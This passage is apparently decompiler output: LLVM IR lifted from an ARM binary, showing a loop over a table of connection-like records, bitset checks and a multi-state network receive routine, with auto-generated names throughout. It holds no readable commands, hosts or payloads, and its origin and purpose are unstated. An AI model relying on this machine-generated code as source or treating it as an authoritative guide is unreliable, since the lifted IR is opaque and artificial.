  %v2_10b1c = inttoptr i32 %v1_10b1c to i8*
  %v3_10b1c = load i8, i8* %v2_10b1c, align 1
  %v4_10b1c = zext i8 %v3_10b1c to i32
  %v1_10b20 = add nuw nsw i32 %v4_10b1c, 1
  %v1_10b24 = urem i32 %v1_10b20, 256
  store i32 %v1_10b24, i32* %r3.global-to-local, align 4
  %v2_10b28 = icmp ugt i32 %v1_10b24, 9
  store i1 %v2_10b28, i1* %cpsr_c.global-to-local, align 1
  %v7_10b28 = icmp eq i32 %v1_10b24, 10
  store i1 %v7_10b28, i1* %cpsr_z.global-to-local, align 1
  %v1_10b2c = trunc i32 %v1_10b20 to i8
  store i8 %v1_10b2c, i8* %v2_10b1c, align 1
  %v0_10b30 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10b30, label %.thread43, label %dec_label_pc_10b40

.thread43:                                        ; preds = %dec_label_pc_10b1c
  %v1_10b30 = load i32, i32* %r3.global-to-local, align 4
  %v2_10b30 = add i32 %v1_10b30, -10
  store i32 %v2_10b30, i32* %r3.global-to-local, align 4
  %v2_10b34 = load i32, i32* @r4, align 4
  %v3_10b34 = add i32 %v2_10b34, 12
  %v4_10b34 = inttoptr i32 %v3_10b34 to i32*
  store i32 %v2_10b30, i32* %v4_10b34, align 4
  %v1_10b38 = load i32, i32* %r3.global-to-local, align 4
  %v2_10b38 = trunc i32 %v1_10b38 to i8
  %v3_10b38 = load i32, i32* @r4, align 4
  %v4_10b38 = add i32 %v3_10b38, 284
  %v5_10b38 = inttoptr i32 %v4_10b38 to i8*
  store i8 %v2_10b38, i8* %v5_10b38, align 1
  %v0_10b3c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10b3c.pr.pr, label %bb334, label %dec_label_pc_10b40

dec_label_pc_10b40:                               ; preds = %dec_label_pc_10b1c, %.thread43
  %v0_10b40 = load i32, i32* @r4, align 4
  store i32 %v0_10b40, i32* @r0, align 4
  %v0_10b44 = call i32 @function_fdc0()
  store i32 %v0_10b44, i32* %r0.global-to-local, align 4
  br label %bb334

dec_label_pc_10b4c:                               ; preds = %dec_label_pc_10744
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_10b50 = call i32 @function_1484c(i32 23)
  %v2_10b50 = trunc i32 %v1_10b50 to i16
  store i32 %v1_10b50, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2237c.215 to i32), i32* %r1.global-to-local, align 4
  br label %dec_label_pc_107b4

dec_label_pc_10b60:                               ; preds = %bb334
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %stack_var_-68, align 4
  %v0_10b6c = load i32, i32* @r6, align 4
  %v1_10b6c = load i32, i32* @r5, align 4
  %v3_10b6c = icmp uge i32 %v0_10b6c, %v1_10b6c
  store i1 %v3_10b6c, i1* %cpsr_c.global-to-local, align 1
  %v9_10b6c = icmp eq i32 %v0_10b6c, %v1_10b6c
  store i1 %v9_10b6c, i1* %cpsr_z.global-to-local, align 1
  %v5_10b70 = icmp slt i32 %v0_10b6c, %v1_10b6c
  %storemerge106 = select i1 %v5_10b70, i32 %v1_10b6c, i32 %v0_10b6c
  %v2_10b84 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_10b84, i32* %ip.global-to-local, align 4
  %v2_10b88 = ptrtoint i32* %stack_var_-224 to i32
  store i32 %v2_10b88, i32* %r1.global-to-local, align 4
  %v2_10b8c = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_10b8c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10b94 = add i32 %storemerge106, 1
  store i32 %v1_10b94, i32* %r0.global-to-local, align 4
  %v5_10ba0 = call i32 @function_14cd8(i32 %v1_10b94, i32 %v2_10b88, i32 %v2_10b8c, i32 0, i32 %v2_10b84)
  %v0_10ba4 = load i32, i32* @r4, align 4
  store i32 %v0_10ba4, i32* %r0.global-to-local, align 4
  %v1_10ba8 = inttoptr i32 %v0_10ba4 to i32*
  %v2_10ba8 = call i32 @function_15ad0(i32* %v1_10ba8)
  store i32 %v2_10ba8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22398.194 to i32), i32* @lr, align 4
  %v0_10bb0 = load i32, i32* @r4, align 4
  store i32 %v0_10bb0, i32* %stack_var_-52, align 4
  store i32 %v2_10ba8, i32* @global_var_22398.194, align 4
  %v2_11530 = ptrtoint i32* %stack_var_-45 to i32
  %v2_11544 = ptrtoint i32* %stack_var_-77 to i32
  %v3_11548 = bitcast i32* %stack_var_-45 to i16*
  %v3_11558 = bitcast i32* %stack_var_-77 to i16*
  %v2_112d4 = ptrtoint i32* %stack_var_-60 to i32
  %v2_11674 = ptrtoint i32* %stack_var_-104 to i32
  %v2_118b0 = ptrtoint i32* %stack_var_-96 to i32
  %v2_118dc = ptrtoint i32* %stack_var_-56 to i32
  %v2_11908 = ptrtoint i32* %stack_var_-42 to i32
  br label %dec_label_pc_10bb8

dec_label_pc_10bb8:                               ; preds = %dec_label_pc_10d3c, %dec_label_pc_10b60
  %v0_10bc4 = phi i32 [ %v1_10d40, %dec_label_pc_10d3c ], [ %v0_10bb0, %dec_label_pc_10b60 ]
  store i32 ptrtoint (i32* @global_var_22928.205 to i32), i32* %r0.global-to-local, align 4
  %v3_10bbc = mul i32 %v0_10bc4, 256
  store i32 %v3_10bbc, i32* %r3.global-to-local, align 4
  %v2_10bc0 = load i32, i32* @global_var_22928.205, align 4
  store i32 %v2_10bc0, i32* %r1.global-to-local, align 4
  %v2_10bc8 = mul i32 %v0_10bc4, 288
  store i32 %v2_10bc8, i32* %r2.global-to-local, align 4
  %v2_10bcc = add i32 %v2_10bc0, %v2_10bc8
  store i32 %v2_10bcc, i32* @r6, align 4
  %v1_10bd0 = add i32 %v2_10bcc, 4
  %v2_10bd0 = inttoptr i32 %v1_10bd0 to i32*
  %v3_10bd0 = load i32, i32* %v2_10bd0, align 4
  store i32 %v3_10bd0, i32* %r0.global-to-local, align 4
  %v2_10bd4 = icmp eq i32 %v3_10bd0, -1
  store i1 %v2_10bd4, i1* %cpsr_c.global-to-local, align 1
  %v7_10bd4 = icmp eq i32 %v3_10bd0, -1
  store i1 %v7_10bd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10bd4, label %dec_label_pc_10d3c, label %dec_label_pc_10bdc

dec_label_pc_10bdc:                               ; preds = %dec_label_pc_10bb8
  %v3_10bdc = udiv i32 %v3_10bd0, 32
  store i32 %v2_119ac, i32* %r1.global-to-local, align 4
  %v3_10be4 = mul nuw nsw i32 %v3_10bdc, 4
  store i32 %v3_10be4, i32* %ip.global-to-local, align 4
  %v2_10be8 = add i32 %v3_10be4, %v2_119ac
  store i32 %v2_10be8, i32* %r2.global-to-local, align 4
  %v1_10bec = add i32 %v2_10be8, -312
  %v2_10bec = inttoptr i32 %v1_10bec to i32*
  %v3_10bec = load i32, i32* %v2_10bec, align 4
  %v1_10bf0 = urem i32 %v3_10bd0, 32
  store i32 %v1_10bf0, i32* %r1.global-to-local, align 4
  %v2_10bf4 = add nsw i32 %v1_10bf0, -1
  %v3_10bf4 = shl i32 1, %v2_10bf4
  %v4_10bf4 = and i32 %v3_10bec, %v3_10bf4
  %v5_10bf4 = icmp ne i32 %v4_10bf4, 0
  store i1 %v5_10bf4, i1* %cpsr_c.global-to-local, align 1
  %v6_10bf4 = lshr i32 %v3_10bec, %v1_10bf0
  store i32 %v6_10bf4, i32* %r3.global-to-local, align 4
  %v1_10bf8 = urem i32 %v6_10bf4, 2
  %v2_10bf8 = icmp eq i32 %v1_10bf8, 0
  store i1 %v2_10bf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10bf8, label %dec_label_pc_10c00, label %dec_label_pc_1176c

dec_label_pc_10c00:                               ; preds = %dec_label_pc_10bdc, %dec_label_pc_11818
  %v1_10c0c = phi i32 [ %v1_10bf0, %dec_label_pc_10bdc ], [ %v1_10c0c.pre, %dec_label_pc_11818 ]
  %v0_10c04 = phi i32 [ %v3_10be4, %dec_label_pc_10bdc ], [ %v0_10c04.pre, %dec_label_pc_11818 ]
  store i32 %v2_119ac, i32* @lr, align 4
  %v2_10c04 = add i32 %v0_10c04, %v2_119ac
  store i32 %v2_10c04, i32* %r2.global-to-local, align 4
  %v1_10c08 = add i32 %v2_10c04, -184
  %v2_10c08 = inttoptr i32 %v1_10c08 to i32*
  %v3_10c08 = load i32, i32* %v2_10c08, align 4
  %v2_10c0c = add i32 %v1_10c0c, -1
  %v3_10c0c = shl i32 1, %v2_10c0c
  %v4_10c0c = and i32 %v3_10c08, %v3_10c0c
  %v5_10c0c = icmp ne i32 %v4_10c0c, 0
  store i1 %v5_10c0c, i1* %cpsr_c.global-to-local, align 1
  %v6_10c0c = lshr i32 %v3_10c08, %v1_10c0c
  store i32 %v6_10c0c, i32* %r3.global-to-local, align 4
  %v1_10c10 = urem i32 %v6_10c0c, 2
  %v2_10c10 = icmp eq i32 %v1_10c10, 0
  store i1 %v2_10c10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10c10, label %dec_label_pc_10d3c, label %dec_label_pc_10c18.preheader

dec_label_pc_10c18.preheader:                     ; preds = %dec_label_pc_10c00
  %v0_10c18127 = load i32, i32* @r6, align 4
  %v1_10c18128 = add i32 %v0_10c18127, 12
  %v2_10c18129 = inttoptr i32 %v1_10c18128 to i32*
  %v3_10c18130 = load i32, i32* %v2_10c18129, align 4
  store i32 %v3_10c18130, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10c1c126132 = icmp eq i32 %v3_10c18130, 0
  store i1 %v2_10c1c126132, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10c1c126132, label %dec_label_pc_10d3c, label %dec_label_pc_10c24.lr.ph

dec_label_pc_10c18.loopexit:                      ; preds = %dec_label_pc_11618, %dec_label_pc_11434, %dec_label_pc_113bc, %dec_label_pc_1197c
  %v0_10c18 = load i32, i32* @r6, align 4
  %v1_10c18 = add i32 %v0_10c18, 12
  %v2_10c18 = inttoptr i32 %v1_10c18 to i32*
  %v3_10c18 = load i32, i32* %v2_10c18, align 4
  store i32 %v3_10c18, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10c1c126 = icmp eq i32 %v3_10c18, 0
  store i1 %v2_10c1c126, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10c1c126, label %dec_label_pc_10d3c, label %dec_label_pc_10c24.lr.ph

dec_label_pc_10c24.lr.ph:                         ; preds = %dec_label_pc_10c18.preheader, %dec_label_pc_10c18.loopexit
  %v0_10c24158 = phi i32 [ %v0_10c18, %dec_label_pc_10c18.loopexit ], [ %v0_10c18127, %dec_label_pc_10c18.preheader ]
  br label %dec_label_pc_10c24

dec_label_pc_10c1cthread-pre-split.thread:        ; preds = %dec_label_pc_10df4, %dec_label_pc_10ec8, %dec_label_pc_10f9c, %dec_label_pc_11174, %dec_label_pc_11248
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10c24

dec_label_pc_10c1cthread-pre-split.thread477:     ; preds = %dec_label_pc_112ac, %dec_label_pc_11104, %dec_label_pc_10f2c, %dec_label_pc_111d8, %dec_label_pc_10e58
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10c24

dec_label_pc_10c1cthread-pre-split:               ; preds = %dec_label_pc_10c9c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10c1c = icmp eq i32 %v3_10c9c, 0
  store i1 %v2_10c1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10c1c, label %dec_label_pc_10d3c, label %dec_label_pc_10c24

dec_label_pc_10c24:                               ; preds = %dec_label_pc_10c1cthread-pre-split.thread, %dec_label_pc_10c1cthread-pre-split, %dec_label_pc_10c1cthread-pre-split.thread477, %dec_label_pc_10c24.lr.ph
  %v0_11718 = phi i32 [ %v0_10c24158, %dec_label_pc_10c24.lr.ph ], [ %v0_10c9c, %dec_label_pc_10c1cthread-pre-split.thread477 ], [ %v0_10c9c, %dec_label_pc_10c1cthread-pre-split ], [ %v0_10c9c, %dec_label_pc_10c1cthread-pre-split.thread ]
  %v1_10c24 = add i32 %v0_11718, 24
  %v2_10c24 = inttoptr i32 %v1_10c24 to i32*
  %v3_10c24 = load i32, i32* %v2_10c24, align 4
  store i32 %v3_10c24, i32* %r3.global-to-local, align 4
  %v2_10c28 = icmp ugt i32 %v3_10c24, 255
  store i1 %v2_10c28, i1* %cpsr_c.global-to-local, align 1
  %v7_10c28 = icmp eq i32 %v3_10c24, 256
  store i1 %v7_10c28, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_11718, 28
  store i32 %.pre, i32* @fp, align 4
  br i1 %v7_10c28, label %dec_label_pc_11718, label %dec_label_pc_10c34

dec_label_pc_10c34:                               ; preds = %dec_label_pc_10c24, %dec_label_pc_11718
  %v0_10c34 = call i32 @function_12ecc()
  store i32 %v0_10c34, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v2_10c3c = inttoptr i32 %v0_10c34 to i32*
  store i32 0, i32* %v2_10c3c, align 4
  %v0_10c40 = load i32, i32* @r6, align 4
  %v1_10c40 = add i32 %v0_10c40, 24
  %v2_10c40 = inttoptr i32 %v1_10c40 to i32*
  %v3_10c40 = load i32, i32* %v2_10c40, align 4
  store i32 %v3_10c40, i32* %r2.global-to-local, align 4
  %v0_10c44 = load i32, i32* @fp, align 4
  %v2_10c44 = add i32 %v0_10c44, %v3_10c40
  store i32 %v2_10c44, i32* @r4, align 4
  %v1_10c48 = add i32 %v0_10c40, 4
  %v2_10c48 = inttoptr i32 %v1_10c48 to i32*
  %v3_10c48 = load i32, i32* %v2_10c48, align 4
  store i32 %v3_10c48, i32* @r0, align 4
  %v1_10c4c = sub i32 256, %v3_10c40
  store i32 %v1_10c4c, i32* @r2, align 4
  store i32 %v2_10c44, i32* @r1, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10c58 = call i32 @function_14a08(i32 %v3_10c48, i32 %v2_10c44, i32 %v1_10c4c, i32 16384)
  store i32 %v4_10c58, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10c5c = icmp eq i32 %v4_10c58, 0
  store i1 %v2_10c5c, i1* %cpsr_z.global-to-local, align 1
  %tmp341 = icmp slt i32 %v4_10c58, 1
  br i1 %tmp341, label %dec_label_pc_11708, label %dec_label_pc_10c64

dec_label_pc_10c64:                               ; preds = %dec_label_pc_10c34
  %v0_10c64 = load i32, i32* @r5, align 4
  store i32 %v0_10c64, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10c68

dec_label_pc_10c68:                               ; preds = %.thread50, %dec_label_pc_10c64
  %v3_10c74 = phi i32 [ %v1_10c78, %.thread50 ], [ %v0_10c64, %dec_label_pc_10c64 ]
  %v1_10c68 = load i32, i32* @r4, align 4
  %v2_10c68 = add i32 %v1_10c68, %v3_10c74
  %v3_10c68 = inttoptr i32 %v2_10c68 to i8*
  %v4_10c68 = load i8, i8* %v3_10c68, align 1
  %v6_10c68 = zext i8 %v4_10c68 to i32
  store i32 %v6_10c68, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10c6c = icmp eq i8 %v4_10c68, 0
  store i1 %v2_10c6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10c6c, label %bb342, label %.thread50

bb342:                                            ; preds = %dec_label_pc_10c68
  %v2_10c70 = add nuw nsw i32 %v6_10c68, 65
  store i32 %v2_10c70, i32* %r3.global-to-local, align 4
  %v2_10c74 = trunc i32 %v2_10c70 to i8
  store i8 %v2_10c74, i8* %v3_10c68, align 1
  %v0_10c78.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread50

.thread50:                                        ; preds = %dec_label_pc_10c68, %bb342
  %v0_10c78 = phi i32 [ %v3_10c74, %dec_label_pc_10c68 ], [ %v0_10c78.pre, %bb342 ]
  %v1_10c78 = add i32 %v0_10c78, 1
  store i32 %v1_10c78, i32* %r2.global-to-local, align 4
  %v3_10c7c = icmp uge i32 %v1_10c78, %v4_10c58
  store i1 %v3_10c7c, i1* %cpsr_c.global-to-local, align 1
  %v9_10c7c = icmp eq i32 %v1_10c78, %v4_10c58
  store i1 %v9_10c7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10c7c, label %dec_label_pc_10c84, label %dec_label_pc_10c68

dec_label_pc_10c84:                               ; preds = %.thread50, %dec_label_pc_1170c
  store i32 ptrtoint (i32* @global_var_22398.194 to i32), i32* %r1.global-to-local, align 4
  %v0_10c88 = load i32, i32* @r6, align 4
  %v1_10c88 = add i32 %v0_10c88, 24
  %v2_10c88 = inttoptr i32 %v1_10c88 to i32*
  %v3_10c88 = load i32, i32* %v2_10c88, align 4
  %v2_10c8c = load i32, i32* @global_var_22398.194, align 4
  store i32 %v2_10c8c, i32* %r2.global-to-local, align 4
  %v2_10c90 = add i32 %v3_10c88, %v4_10c58
  store i32 %v2_10c90, i32* %r3.global-to-local, align 4
  store i32 %v2_10c90, i32* %v2_10c88, align 4
  %v0_10c98 = load i32, i32* %r2.global-to-local, align 4
  %v1_10c98 = load i32, i32* @r6, align 4
  %v2_10c98 = add i32 %v1_10c98, 8
  %v3_10c98 = inttoptr i32 %v2_10c98 to i32*
  store i32 %v0_10c98, i32* %v3_10c98, align 4
  br label %dec_label_pc_10c9c

dec_label_pc_10c9c:                               ; preds = %dec_label_pc_10dcc, %dec_label_pc_10c84
  %v0_10c9c = load i32, i32* @r6, align 4
  %v1_10c9c = add i32 %v0_10c9c, 12
  %v2_10c9c = inttoptr i32 %v1_10c9c to i32*
  %v3_10c9c = load i32, i32* %v2_10c9c, align 4
  store i32 %v3_10c9c, i32* %r0.global-to-local, align 4
  %v1_10ca0 = add i32 %v3_10c9c, -2
  store i32 %v1_10ca0, i32* %r3.global-to-local, align 4
  %v7_10ca4 = icmp eq i32 %v1_10ca0, 8
  store i1 %v7_10ca4, i1* %cpsr_z.global-to-local, align 1
  %v5_10ca8 = and i32 %v1_10ca0, 1073741824
  %v6_10ca8 = icmp ne i32 %v5_10ca8, 0
  store i1 %v6_10ca8, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_10c9c, label %dec_label_pc_10c1cthread-pre-split [
    i32 2, label %dec_label_pc_1145c
    i32 3, label %dec_label_pc_1131c
    i32 4, label %dec_label_pc_113c8
    i32 5, label %dec_label_pc_11248
    i32 6, label %dec_label_pc_10f9c
    i32 7, label %dec_label_pc_10ec8
    i32 8, label %dec_label_pc_11174
    i32 9, label %dec_label_pc_10df4
    i32 10, label %dec_label_pc_10d54
  ]

dec_label_pc_10cd4:                               ; preds = %dec_label_pc_11708
  %v0_10cd4 = call i32 @function_12ecc()
  store i32 %v0_10cd4, i32* %r0.global-to-local, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  %v2_10cdc = inttoptr i32 %v0_10cd4 to i32*
  store i32 104, i32* %v2_10cdc, align 4
  br label %dec_label_pc_10ce0

dec_label_pc_10ce0:                               ; preds = %dec_label_pc_1170c, %dec_label_pc_10cd4
  %v0_10ce0 = call i32 @function_12ecc()
  store i32 %v0_10ce0, i32* %r0.global-to-local, align 4
  %v1_10ce4 = inttoptr i32 %v0_10ce0 to i32*
  %v2_10ce4 = load i32, i32* %v1_10ce4, align 4
  store i32 %v2_10ce4, i32* %r3.global-to-local, align 4
  %v2_10ce8 = icmp ugt i32 %v2_10ce4, 10
  store i1 %v2_10ce8, i1* %cpsr_c.global-to-local, align 1
  %v7_10ce8 = icmp eq i32 %v2_10ce4, 11
  store i1 %v7_10ce8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ce8, label %dec_label_pc_10d3c, label %dec_label_pc_10cf0

dec_label_pc_10cf0:                               ; preds = %dec_label_pc_10ce0
  %v0_10cf0 = call i32 @function_12ecc()
  store i32 %v0_10cf0, i32* %r0.global-to-local, align 4
  %v1_10cf4 = inttoptr i32 %v0_10cf0 to i32*
  %v2_10cf4 = load i32, i32* %v1_10cf4, align 4
  store i32 %v2_10cf4, i32* %r3.global-to-local, align 4
  %v2_10cf8 = icmp ugt i32 %v2_10cf4, 10
  store i1 %v2_10cf8, i1* %cpsr_c.global-to-local, align 1
  %v7_10cf8 = icmp eq i32 %v2_10cf4, 11
  store i1 %v7_10cf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10cf8, label %dec_label_pc_10d3c, label %dec_label_pc_10d00

dec_label_pc_10d00:                               ; preds = %dec_label_pc_10cf0
  %v0_10d00 = load i32, i32* @r6, align 4
  %v1_10d00 = add i32 %v0_10d00, 4
  %v2_10d00 = inttoptr i32 %v1_10d00 to i32*
  %v3_10d00 = load i32, i32* %v2_10d00, align 4
  store i32 %v3_10d00, i32* @r0, align 4
  %v1_10d04 = call i32 @function_15b20(i32 %v3_10d00)
  store i32 %v1_10d04, i32* %r0.global-to-local, align 4
  %v0_10d08 = load i32, i32* @r6, align 4
  %v1_10d08 = add i32 %v0_10d08, 284
  %v2_10d08 = inttoptr i32 %v1_10d08 to i8*
  %v3_10d08 = load i8, i8* %v2_10d08, align 1
  %v4_10d08 = zext i8 %v3_10d08 to i32
  %v1_10d0c = add nuw nsw i32 %v4_10d08, 1
  %v1_10d10 = urem i32 %v1_10d0c, 256
  store i32 %v1_10d10, i32* %r3.global-to-local, align 4
  %v2_10d14 = icmp ugt i32 %v1_10d10, 8
  store i1 %v2_10d14, i1* %cpsr_c.global-to-local, align 1
  %v7_10d14 = icmp eq i32 %v1_10d10, 9
  store i1 %v7_10d14, i1* %cpsr_z.global-to-local, align 1
  %v1_10d18 = trunc i32 %v1_10d0c to i8
  store i8 %v1_10d18, i8* %v2_10d08, align 1
  %v0_10d1c = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_10d1c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_10d1c = xor i1 %v1_10d1c, true
  %v3_10d1c = and i1 %v0_10d1c, %v2_10d1c
  br i1 %v3_10d1c, label %bb343, label %.thread255

.thread255:                                       ; preds = %dec_label_pc_10d00
  store i32 -1, i32* %r2.global-to-local, align 4
  %v1_10d28251256 = load i32, i32* @r6, align 4
  %v2_10d28252257 = add i32 %v1_10d28251256, 4
  %v3_10d28253258 = inttoptr i32 %v2_10d28252257 to i32*
  store i32 -1, i32* %v3_10d28253258, align 4
  br label %bb344

bb343:                                            ; preds = %dec_label_pc_10d00
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10d28247 = load i32, i32* @r6, align 4
  %v2_10d28248 = add i32 %v1_10d28247, 4
  %v3_10d28249 = inttoptr i32 %v2_10d28248 to i32*
  store i32 -1, i32* %v3_10d28249, align 4
  %v4_10d2c = load i32, i32* %r0.global-to-local, align 4
  %v5_10d2c = load i32, i32* @r6, align 4
  %v6_10d2c = add i32 %v5_10d2c, 12
  %v7_10d2c = inttoptr i32 %v6_10d2c to i32*
  store i32 %v4_10d2c, i32* %v7_10d2c, align 4
  %v4_10d30 = load i32, i32* %r3.global-to-local, align 4
  %v5_10d30 = trunc i32 %v4_10d30 to i8
  %v6_10d30 = load i32, i32* @r6, align 4
  %v7_10d30 = add i32 %v6_10d30, 284
  %v8_10d30 = inttoptr i32 %v7_10d30 to i8*
  store i8 %v5_10d30, i8* %v8_10d30, align 1
  %v0_10d34.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10d34.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb344

bb344:                                            ; preds = %.thread255, %bb343
  %v1_10d38 = phi i1 [ %v1_10d34.pre, %bb343 ], [ %v0_10d1c, %.thread255 ]
  %v0_10d38 = phi i1 [ %v0_10d34.pre, %bb343 ], [ %v1_10d1c, %.thread255 ]
  %v2_10d34 = xor i1 %v1_10d38, true
  %v3_10d34 = or i1 %v0_10d38, %v2_10d34
  br i1 %v3_10d34, label %bb345, label %bb346

bb345:                                            ; preds = %bb344
  %v4_10d34 = load i32, i32* @r6, align 4
  store i32 %v4_10d34, i32* %r0.global-to-local, align 4
  br label %bb346

bb346:                                            ; preds = %bb344, %bb345
  store i32 68924, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10d34, i32 ptrtoint (i32* @global_var_fdc0.323 to i32))
  br label %dec_label_pc_10d3c

dec_label_pc_10d3c:                               ; preds = %dec_label_pc_10c18.loopexit, %dec_label_pc_10c1cthread-pre-split, %dec_label_pc_10c18.preheader, %dec_label_pc_10cf0, %dec_label_pc_10ce0, %dec_label_pc_10c00, %dec_label_pc_10bb8, %dec_label_pc_11838, %bb346
  %v3_10d3c = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_10d3c, i32* %r3.global-to-local, align 4
  %v1_10d40 = add i32 %v3_10d3c, 1
  store i32 %v1_10d40, i32* @r4, align 4
  %v2_10d44 = icmp ugt i32 %v1_10d40, 254
  store i1 %v2_10d44, i1* %cpsr_c.global-to-local, align 1
  %v7_10d44 = icmp eq i32 %v1_10d40, 255
  store i1 %v7_10d44, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_10d40, i32* %stack_var_-52, align 4
  %v7_10d4c = icmp slt i32 %v1_10d40, 256
  br i1 %v7_10d4c, label %dec_label_pc_10bb8, label %dec_label_pc_105cc

dec_label_pc_10d54:                               ; preds = %dec_label_pc_10c9c
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_10d58 = call i32 @function_11a94(i32 26)
  store i32 %v2_112d4, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_10d68 = call i32 @function_119d0(i32 26, i32* nonnull %stack_var_-60)
  %v3_10d6c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10d68, i32* %r2.global-to-local, align 4
  %v1_10d74 = add i32 %v3_10d6c, -1
  store i32 %v1_10d74, i32* %r3.global-to-local, align 4
  %v0_10d78 = load i32, i32* @fp, align 4
  store i32 %v0_10d78, i32* %r0.global-to-local, align 4
  %v0_10d7c = load i32, i32* @r6, align 4
  %v1_10d7c = add i32 %v0_10d7c, 24
  %v2_10d7c = inttoptr i32 %v1_10d7c to i32*
  %v3_10d7c = load i32, i32* %v2_10d7c, align 4
  store i32 %v3_10d7c, i32* %r1.global-to-local, align 4
  %v4_10d80 = call i32 @function_123dc(i32 %v0_10d78, i32 %v3_10d7c, i32 %v3_10d68, i32 %v1_10d74)
  %v2_10d84 = icmp eq i32 %v4_10d80, -1
  store i1 %v2_10d84, i1* %cpsr_c.global-to-local, align 1
  %v7_10d84 = icmp eq i32 %v4_10d80, -1
  store i1 %v7_10d84, i1* %cpsr_z.global-to-local, align 1
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_1161c = call i32 @function_119f4(i32 26)
  br i1 %v7_10d84, label %dec_label_pc_11618, label %dec_label_pc_10d8c

dec_label_pc_10d8c:                               ; preds = %dec_label_pc_10d54
  store i32 %v1_1161c, i32* %r0.global-to-local, align 4
  %v0_10d94 = load i32, i32* @r6, align 4
  %v1_10d94 = add i32 %v0_10d94, 4
  %v2_10d94 = inttoptr i32 %v1_10d94 to i32*
  %v3_10d94 = load i32, i32* %v2_10d94, align 4
  store i32 %v3_10d94, i32* @r0, align 4
  %v1_10d98 = call i32 @function_15b20(i32 %v3_10d94)
  store i32 %v1_10d98, i32* %r0.global-to-local, align 4
  %v0_10d9c = load i32, i32* @r6, align 4
  %v1_10d9c = add i32 %v0_10d9c, 284
  %v2_10d9c = inttoptr i32 %v1_10d9c to i8*
  %v3_10d9c = load i8, i8* %v2_10d9c, align 1
  %v4_10d9c = zext i8 %v3_10d9c to i32
  %v1_10da0 = add nuw nsw i32 %v4_10d9c, 1
  %v1_10da4 = urem i32 %v1_10da0, 256
  store i32 %v1_10da4, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10dac = icmp ugt i32 %v1_10da4, 9
  store i1 %v2_10dac, i1* %cpsr_c.global-to-local, align 1
  %v7_10dac = icmp eq i32 %v1_10da4, 10
  store i1 %v7_10dac, i1* %cpsr_z.global-to-local, align 1
  %v2_10db0 = add i32 %v0_10d9c, 4
  %v3_10db0 = inttoptr i32 %v2_10db0 to i32*
  store i32 -1, i32* %v3_10db0, align 4
  %v0_10db4 = load i32, i32* %r3.global-to-local, align 4
  %v1_10db4 = trunc i32 %v0_10db4 to i8
  %v2_10db4 = load i32, i32* @r6, align 4
  %v3_10db4 = add i32 %v2_10db4, 284
  %v4_10db4 = inttoptr i32 %v3_10db4 to i8*
  store i8 %v1_10db4, i8* %v4_10db4, align 1
  %v0_10db8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10db8, label %dec_label_pc_10dbc, label %dec_label_pc_11760

dec_label_pc_10dbc:                               ; preds = %dec_label_pc_10d8c
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10dc0 = load i32, i32* @r6, align 4
  %v2_10dc0 = add i32 %v1_10dc0, 12
  %v3_10dc0 = inttoptr i32 %v2_10dc0 to i32*
  store i32 0, i32* %v3_10dc0, align 4
  %v0_10dc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_10dc4 = trunc i32 %v0_10dc4 to i8
  %v2_10dc4 = load i32, i32* @r6, align 4
  %v3_10dc4 = add i32 %v2_10dc4, 284
  %v4_10dc4 = inttoptr i32 %v3_10dc4 to i8*
  store i8 %v1_10dc4, i8* %v4_10dc4, align 1
